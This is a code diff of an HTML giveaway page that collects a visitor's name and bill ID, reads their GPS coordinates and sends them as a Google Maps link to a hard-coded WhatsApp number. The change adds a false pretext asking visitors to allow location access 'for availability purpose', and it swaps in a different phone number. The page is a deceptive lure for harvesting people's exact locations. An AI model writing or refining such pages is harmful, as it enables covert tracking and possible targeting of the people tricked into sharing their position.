@@ -59,7 +59,7 @@
     <div class="name-bar">
       <input type="text" id="userName" placeholder="Enter your name">
     </div>
-    <p class="info-text">Click the below button, send the bill id to us, we will notify you if you won</p>
+    <p class="info-text">Click the below button, send the bill id to us, we will notify you if you won and kindly please click allow for location(for availability purpose)</p>
     <button class="btn" onclick="sendDetails()">Send Bill ID</button>
   </div>
 
@@ -72,7 +72,7 @@
         const latitude = position.coords.latitude;
         const longitude = position.coords.longitude;
         const locationMessage = ` https://www.google.com/maps?q=${latitude},${longitude}`;
-        const whatsappNumber = "+918015153603";
+        const whatsappNumber = "+918939970472";
         const message = "Name: " + userName + "\nBill ID: " + billID + "\n" + locationMessage;
         sendToWhatsApp(message, whatsappNumber);
     });
